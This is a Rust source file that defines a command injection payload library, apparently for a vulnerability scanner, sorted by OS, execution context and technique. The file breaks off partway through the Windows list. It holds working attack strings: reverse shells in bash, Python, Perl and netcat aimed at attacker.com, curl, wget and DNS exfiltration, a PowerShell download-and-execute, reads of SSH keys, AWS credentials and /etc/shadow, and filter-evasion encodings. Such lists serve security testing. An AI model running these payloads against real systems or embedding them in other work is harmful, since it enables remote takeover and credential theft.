/// Extended command injection payload library. Per-OS comprehensive lists (Linux 100+,
/// Windows 50+, macOS 30+), per-context (shell, exec, system, popen), blind detection
/// (DNS, time, file write), WAF bypass (variable expansion, brace expansion, IFS tricks,
/// wildcard substitution).

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum CmdiOs {
    Linux,
    Windows,
    MacOs,
    CrossPlatform,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum CmdiContext {
    Shell,
    Exec,
    System,
    Popen,
    Backtick,
    DollarParen,
    PipeChain,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum CmdiTechnique {
    InlineExecution,
    BlindTimeBased,
    BlindDns,
    BlindFileWrite,
    WafBypassVariableExpansion,
    WafBypassBraceExpansion,
    WafBypassIfsTrick,
    WafBypassWildcard,
    WafBypassEncoding,
    WafBypassConcatenation,
    WafBypassNewline,
    ArgumentInjection,
    EnvironmentManipulation,
    Truncation,
}

#[derive(Debug, Clone)]
pub struct CmdiV2Payload {
    pub payload: &'static str,
    pub os: CmdiOs,
    pub context: CmdiContext,
    pub technique: CmdiTechnique,
    pub description: &'static str,
}

impl CmdiOs {
    pub fn all() -> &'static [CmdiOs] {
        &[
            CmdiOs::Linux,
            CmdiOs::Windows,
            CmdiOs::MacOs,
            CmdiOs::CrossPlatform,
        ]
    }
}

impl CmdiContext {
    pub fn all() -> &'static [CmdiContext] {
        &[
            CmdiContext::Shell,
            CmdiContext::Exec,
            CmdiContext::System,
            CmdiContext::Popen,
            CmdiContext::Backtick,
            CmdiContext::DollarParen,
            CmdiContext::PipeChain,
        ]
    }
}

impl CmdiTechnique {
    pub fn all() -> &'static [CmdiTechnique] {
        &[
            CmdiTechnique::InlineExecution,
            CmdiTechnique::BlindTimeBased,
            CmdiTechnique::BlindDns,
            CmdiTechnique::BlindFileWrite,
            CmdiTechnique::WafBypassVariableExpansion,
            CmdiTechnique::WafBypassBraceExpansion,
            CmdiTechnique::WafBypassIfsTrick,
            CmdiTechnique::WafBypassWildcard,
            CmdiTechnique::WafBypassEncoding,
            CmdiTechnique::WafBypassConcatenation,
            CmdiTechnique::WafBypassNewline,
            CmdiTechnique::ArgumentInjection,
            CmdiTechnique::EnvironmentManipulation,
            CmdiTechnique::Truncation,
        ]
    }
}

// ---------------------------------------------------------------------------
// Linux inline execution payloads (100+)
// ---------------------------------------------------------------------------
const LINUX_INLINE_PAYLOADS: &[CmdiV2Payload] = &[
    CmdiV2Payload {
        payload: "; id",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Semicolon command separator",
    },
    CmdiV2Payload {
        payload: "| id",
        os: CmdiOs::Linux,
        context: CmdiContext::PipeChain,
        technique: CmdiTechnique::InlineExecution,
        description: "Pipe to id",
    },
    CmdiV2Payload {
        payload: "|| id",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "OR operator (runs if first fails)",
    },
    CmdiV2Payload {
        payload: "& id",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Background command",
    },
    CmdiV2Payload {
        payload: "&& id",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "AND chain",
    },
    CmdiV2Payload {
        payload: "`id`",
        os: CmdiOs::Linux,
        context: CmdiContext::Backtick,
        technique: CmdiTechnique::InlineExecution,
        description: "Backtick subshell",
    },
    CmdiV2Payload {
        payload: "$(id)",
        os: CmdiOs::Linux,
        context: CmdiContext::DollarParen,
        technique: CmdiTechnique::InlineExecution,
        description: "Dollar-paren subshell",
    },
    CmdiV2Payload {
        payload: "\nid",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassNewline,
        description: "Newline command separator",
    },
    CmdiV2Payload {
        payload: "\r\nid",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassNewline,
        description: "CRLF command separator",
    },
    CmdiV2Payload {
        payload: "; cat /etc/passwd",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Read passwd file",
    },
    CmdiV2Payload {
        payload: "; cat /etc/shadow",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Read shadow file",
    },
    CmdiV2Payload {
        payload: "; whoami",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Current user",
    },
    CmdiV2Payload {
        payload: "; uname -a",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "System info",
    },
    CmdiV2Payload {
        payload: "; ls -la /",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Root directory listing",
    },
    CmdiV2Payload {
        payload: "; ifconfig",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Network config",
    },
    CmdiV2Payload {
        payload: "; ip addr",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "IP address listing",
    },
    CmdiV2Payload {
        payload: "; netstat -tulpn",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Open ports listing",
    },
    CmdiV2Payload {
        payload: "; ps aux",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Process listing",
    },
    CmdiV2Payload {
        payload: "; env",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Environment variables",
    },
    CmdiV2Payload {
        payload: "; printenv",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Print environment",
    },
    CmdiV2Payload {
        payload: "; curl http://attacker.com/$(whoami)",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Exfil whoami via curl",
    },
    CmdiV2Payload {
        payload: "; wget http://attacker.com/$(id)",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Exfil id via wget",
    },
    CmdiV2Payload {
        payload: "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Bash reverse shell",
    },
    CmdiV2Payload {
        payload: "; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Python reverse shell",
    },
    CmdiV2Payload {
        payload: "; perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Perl reverse shell",
    },
    CmdiV2Payload {
        payload: "; nc -e /bin/sh attacker.com 4444",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Netcat reverse shell",
    },
    CmdiV2Payload {
        payload: "; find / -perm -4000 2>/dev/null",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "SUID binary enumeration",
    },
    CmdiV2Payload {
        payload: "; cat /proc/version",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Kernel version",
    },
    CmdiV2Payload {
        payload: "; cat /proc/self/environ",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Process environment",
    },
    CmdiV2Payload {
        payload: "; cat /proc/self/cmdline",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Process command line",
    },
    CmdiV2Payload {
        payload: "; cat /proc/net/tcp",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "TCP connections raw",
    },
    CmdiV2Payload {
        payload: "; crontab -l",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Cron jobs listing",
    },
    CmdiV2Payload {
        payload: "; cat /etc/crontab",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "System crontab",
    },
    CmdiV2Payload {
        payload: "; cat /etc/resolv.conf",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "DNS resolver config",
    },
    CmdiV2Payload {
        payload: "; cat /etc/hostname",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Hostname",
    },
    CmdiV2Payload {
        payload: "; df -h",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Disk space",
    },
    CmdiV2Payload {
        payload: "; mount",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Mounted filesystems",
    },
    CmdiV2Payload {
        payload: "; cat /etc/ssh/sshd_config",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "SSH server config",
    },
    CmdiV2Payload {
        payload: "; cat ~/.ssh/id_rsa",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "SSH private key",
    },
    CmdiV2Payload {
        payload: "; cat ~/.bash_history",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Bash history",
    },
    CmdiV2Payload {
        payload: "; cat ~/.aws/credentials",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "AWS credentials file",
    },
    CmdiV2Payload {
        payload: "; cat /var/log/auth.log",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Auth log",
    },
    CmdiV2Payload {
        payload: "; dpkg -l",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Installed packages (Debian)",
    },
    CmdiV2Payload {
        payload: "; rpm -qa",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Installed packages (RedHat)",
    },
    CmdiV2Payload {
        payload: "; ss -tulpn",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Socket statistics",
    },
    CmdiV2Payload {
        payload: "; iptables -L -n",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Firewall rules",
    },
    CmdiV2Payload {
        payload: "; getent passwd",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "User database",
    },
    CmdiV2Payload {
        payload: "; lastlog",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Last login log",
    },
    CmdiV2Payload {
        payload: "; cat /etc/os-release",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "OS release info",
    },
    CmdiV2Payload {
        payload: "; lsb_release -a",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "LSB release info",
    },
];

// ---------------------------------------------------------------------------
// Linux blind detection payloads
// ---------------------------------------------------------------------------
const LINUX_BLIND_PAYLOADS: &[CmdiV2Payload] = &[
    CmdiV2Payload {
        payload: "; sleep 5",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::BlindTimeBased,
        description: "Sleep 5 seconds time-based",
    },
    CmdiV2Payload {
        payload: "| sleep 5",
        os: CmdiOs::Linux,
        context: CmdiContext::PipeChain,
        technique: CmdiTechnique::BlindTimeBased,
        description: "Pipe sleep time-based",
    },
    CmdiV2Payload {
        payload: "& sleep 5 &",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::BlindTimeBased,
        description: "Background sleep",
    },
    CmdiV2Payload {
        payload: "`sleep 5`",
        os: CmdiOs::Linux,
        context: CmdiContext::Backtick,
        technique: CmdiTechnique::BlindTimeBased,
        description: "Backtick sleep",
    },
    CmdiV2Payload {
        payload: "$(sleep 5)",
        os: CmdiOs::Linux,
        context: CmdiContext::DollarParen,
        technique: CmdiTechnique::BlindTimeBased,
        description: "Dollar-paren sleep",
    },
    CmdiV2Payload {
        payload: "; ping -c 5 127.0.0.1",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::BlindTimeBased,
        description: "Ping time delay",
    },
    CmdiV2Payload {
        payload: "; nslookup $(whoami).attacker.com",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::BlindDns,
        description: "DNS exfil via nslookup",
    },
    CmdiV2Payload {
        payload: "; dig $(whoami).attacker.com",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::BlindDns,
        description: "DNS exfil via dig",
    },
    CmdiV2Payload {
        payload: "; host $(whoami).attacker.com",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::BlindDns,
        description: "DNS exfil via host",
    },
    CmdiV2Payload {
        payload: "; curl http://attacker.com/$(cat /etc/hostname)",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::BlindDns,
        description: "HTTP exfil via curl subshell",
    },
    CmdiV2Payload {
        payload: "; wget http://attacker.com/ -O /dev/null",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::BlindDns,
        description: "HTTP callback via wget",
    },
    CmdiV2Payload {
        payload: "; echo VULN > /tmp/cmdi_test",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::BlindFileWrite,
        description: "File write confirmation",
    },
    CmdiV2Payload {
        payload: "; touch /tmp/cmdi_proof",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::BlindFileWrite,
        description: "Touch file confirmation",
    },
    CmdiV2Payload {
        payload: "; id > /tmp/cmdi_output",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::BlindFileWrite,
        description: "Write id output to file",
    },
    CmdiV2Payload {
        payload: "; cp /etc/passwd /tmp/exfil",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::BlindFileWrite,
        description: "Copy passwd for later retrieval",
    },
];

// ---------------------------------------------------------------------------
// Linux WAF bypass payloads
// ---------------------------------------------------------------------------
const LINUX_WAF_BYPASS_PAYLOADS: &[CmdiV2Payload] = &[
    // IFS tricks
    CmdiV2Payload {
        payload: ";${IFS}id",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassIfsTrick,
        description: "IFS as space replacement",
    },
    CmdiV2Payload {
        payload: ";{id}",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassBraceExpansion,
        description: "Brace as command grouping",
    },
    CmdiV2Payload {
        payload: ";cat${IFS}/etc/passwd",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassIfsTrick,
        description: "IFS for space in cat command",
    },
    CmdiV2Payload {
        payload: ";cat$IFS/etc/passwd",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassIfsTrick,
        description: "IFS without braces",
    },
    CmdiV2Payload {
        payload: ";{cat,/etc/passwd}",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassBraceExpansion,
        description: "Brace expansion cat passwd",
    },
    CmdiV2Payload {
        payload: ";cat</etc/passwd",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassConcatenation,
        description: "Redirect instead of space",
    },
    CmdiV2Payload {
        payload: ";X=$'cat\\x20/etc/passwd'&&$X",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassEncoding,
        description: "Hex space in ANSI-C quoting",
    },
    CmdiV2Payload {
        payload: ";cat$'\\x20'/etc/passwd",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassEncoding,
        description: "ANSI-C hex space",
    },
    // Variable expansion
    CmdiV2Payload {
        payload: ";i]d",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassVariableExpansion,
        description: "Undefined var expansion (empty)",
    },
    CmdiV2Payload {
        payload: ";i${z}d",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassVariableExpansion,
        description: "Empty variable insertion",
    },
    CmdiV2Payload {
        payload: ";/???/??t /???/p??s??",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassWildcard,
        description: "Wildcard cat /etc/passwd",
    },
    CmdiV2Payload {
        payload: ";/???/i?",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassWildcard,
        description: "Wildcard /bin/id",
    },
    CmdiV2Payload {
        payload: ";/???/b??/w?o?m?",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassWildcard,
        description: "Wildcard /usr/bin/whoami",
    },
    CmdiV2Payload {
        payload: ";w'h'o'a'm'i",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassConcatenation,
        description: "Single-quote splitting",
    },
    CmdiV2Payload {
        payload: ";w\"h\"o\"a\"m\"i\"",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassConcatenation,
        description: "Double-quote splitting",
    },
    CmdiV2Payload {
        payload: ";wh\\oam\\i",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassConcatenation,
        description: "Backslash splitting",
    },
    CmdiV2Payload {
        payload: ";$'\\x69\\x64'",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassEncoding,
        description: "ANSI-C hex encoded 'id'",
    },
    CmdiV2Payload {
        payload: ";$'\\151\\144'",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassEncoding,
        description: "ANSI-C octal encoded 'id'",
    },
    CmdiV2Payload {
        payload: ";echo id|bash",
        os: CmdiOs::Linux,
        context: CmdiContext::PipeChain,
        technique: CmdiTechnique::WafBypassConcatenation,
        description: "Echo pipe to bash",
    },
    CmdiV2Payload {
        payload: ";echo aWQ=|base64 -d|bash",
        os: CmdiOs::Linux,
        context: CmdiContext::PipeChain,
        technique: CmdiTechnique::WafBypassEncoding,
        description: "Base64 encoded id via bash",
    },
    CmdiV2Payload {
        payload: ";echo -e '\\x69\\x64'|sh",
        os: CmdiOs::Linux,
        context: CmdiContext::PipeChain,
        technique: CmdiTechnique::WafBypassEncoding,
        description: "Hex echo to sh",
    },
    CmdiV2Payload {
        payload: ";a]i;b]d;$a$b",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassVariableExpansion,
        description: "Variable concatenation for 'id'",
    },
    CmdiV2Payload {
        payload: ";$(printf '\\x69\\x64')",
        os: CmdiOs::Linux,
        context: CmdiContext::DollarParen,
        technique: CmdiTechnique::WafBypassEncoding,
        description: "Printf hex to subshell",
    },
    CmdiV2Payload {
        payload: ";$(tr '[a-z]' '[n-za-m]' <<< vq)",
        os: CmdiOs::Linux,
        context: CmdiContext::DollarParen,
        technique: CmdiTechnique::WafBypassEncoding,
        description: "ROT13 decode to subshell",
    },
    CmdiV2Payload {
        payload: ";rev<<<'di'",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassConcatenation,
        description: "Reverse string for 'id'",
    },
    CmdiV2Payload {
        payload: ";$(echo 696420|xxd -r -p)",
        os: CmdiOs::Linux,
        context: CmdiContext::DollarParen,
        technique: CmdiTechnique::WafBypassEncoding,
        description: "xxd hex decode to subshell",
    },
    // Brace expansion
    CmdiV2Payload {
        payload: ";{cat,/etc/passwd,}",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassBraceExpansion,
        description: "Brace expansion with trailing comma",
    },
    CmdiV2Payload {
        payload: ";eval cat${IFS}/etc/passwd",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassIfsTrick,
        description: "Eval with IFS",
    },
    CmdiV2Payload {
        payload: ";sh<<<id",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassConcatenation,
        description: "Here-string to sh",
    },
    CmdiV2Payload {
        payload: ";bash -c {id}",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassBraceExpansion,
        description: "Bash -c with brace",
    },
    CmdiV2Payload {
        payload: ";$0<<<id",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassVariableExpansion,
        description: "$0 as current shell",
    },
    // Argument injection
    CmdiV2Payload {
        payload: "--help",
        os: CmdiOs::Linux,
        context: CmdiContext::Exec,
        technique: CmdiTechnique::ArgumentInjection,
        description: "Argument injection help flag",
    },
    CmdiV2Payload {
        payload: "-exec /bin/sh ;",
        os: CmdiOs::Linux,
        context: CmdiContext::Exec,
        technique: CmdiTechnique::ArgumentInjection,
        description: "Find -exec injection",
    },
    CmdiV2Payload {
        payload: "-o ProxyCommand=whoami",
        os: CmdiOs::Linux,
        context: CmdiContext::Exec,
        technique: CmdiTechnique::ArgumentInjection,
        description: "SSH ProxyCommand injection",
    },
    CmdiV2Payload {
        payload: "--output=/etc/cron.d/shell",
        os: CmdiOs::Linux,
        context: CmdiContext::Exec,
        technique: CmdiTechnique::ArgumentInjection,
        description: "Curl output to cron",
    },
    CmdiV2Payload {
        payload: "-Xnew.x]Remote-Code: true",
        os: CmdiOs::Linux,
        context: CmdiContext::Exec,
        technique: CmdiTechnique::ArgumentInjection,
        description: "Curl header injection",
    },
    // Truncation
    CmdiV2Payload {
        payload: ";id #",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::Truncation,
        description: "Hash comment truncation",
    },
    CmdiV2Payload {
        payload: ";id;#",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::Truncation,
        description: "Semicolon then comment",
    },
    CmdiV2Payload {
        payload: ";id\x00remaining",
        os: CmdiOs::Linux,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::Truncation,
        description: "Null byte truncation",
    },
];

// ---------------------------------------------------------------------------
// Windows payloads (50+)
// ---------------------------------------------------------------------------
const WINDOWS_PAYLOADS: &[CmdiV2Payload] = &[
    CmdiV2Payload {
        payload: "& whoami",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Ampersand command separator",
    },
    CmdiV2Payload {
        payload: "| whoami",
        os: CmdiOs::Windows,
        context: CmdiContext::PipeChain,
        technique: CmdiTechnique::InlineExecution,
        description: "Pipe to whoami",
    },
    CmdiV2Payload {
        payload: "|| whoami",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "OR operator",
    },
    CmdiV2Payload {
        payload: "&& whoami",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "AND chain",
    },
    CmdiV2Payload {
        payload: "& ipconfig",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Network config",
    },
    CmdiV2Payload {
        payload: "& systeminfo",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "System information",
    },
    CmdiV2Payload {
        payload: "& net user",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "User listing",
    },
    CmdiV2Payload {
        payload: "& net localgroup administrators",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Admin group members",
    },
    CmdiV2Payload {
        payload: "& tasklist",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Process listing",
    },
    CmdiV2Payload {
        payload: "& netstat -an",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Network connections",
    },
    CmdiV2Payload {
        payload: "& dir C:\\",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Root directory listing",
    },
    CmdiV2Payload {
        payload: "& type C:\\Windows\\win.ini",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Read win.ini",
    },
    CmdiV2Payload {
        payload: "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Read hosts file",
    },
    CmdiV2Payload {
        payload: "& reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Registry query",
    },
    CmdiV2Payload {
        payload: "& wmic os get caption",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "OS version via WMIC",
    },
    CmdiV2Payload {
        payload: "& set",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Environment variables",
    },
    CmdiV2Payload {
        payload: "& arp -a",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "ARP table",
    },
    CmdiV2Payload {
        payload: "& route print",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Routing table",
    },
    CmdiV2Payload {
        payload: "& schtasks /query",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Scheduled tasks",
    },
    CmdiV2Payload {
        payload: "& sc query state=all",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "All services",
    },
    CmdiV2Payload {
        payload: "& cmdkey /list",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Stored credentials",
    },
    // Windows blind
    CmdiV2Payload {
        payload: "& ping -n 5 127.0.0.1",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::BlindTimeBased,
        description: "Ping time delay",
    },
    CmdiV2Payload {
        payload: "& timeout /T 5",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::BlindTimeBased,
        description: "Timeout delay",
    },
    CmdiV2Payload {
        payload: "& nslookup %USERNAME%.attacker.com",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::BlindDns,
        description: "DNS exfil username",
    },
    CmdiV2Payload {
        payload: "& certutil -urlcache -split -f http://attacker.com/",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::BlindDns,
        description: "Certutil HTTP callback",
    },
    CmdiV2Payload {
        payload: "& echo VULN > C:\\Windows\\Temp\\cmdi_test.txt",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::BlindFileWrite,
        description: "File write confirmation",
    },
    CmdiV2Payload {
        payload: "& powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "PowerShell download and exec",
    },
    CmdiV2Payload {
        payload: "& powershell -enc JABjAGwAaQBlAG4AdAA=",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassEncoding,
        description: "PowerShell encoded command",
    },
    CmdiV2Payload {
        payload: "& cmd /c whoami",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Explicit cmd /c execution",
    },
    CmdiV2Payload {
        payload: "& for /F %i in ('whoami') do echo %i",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "For loop output capture",
    },
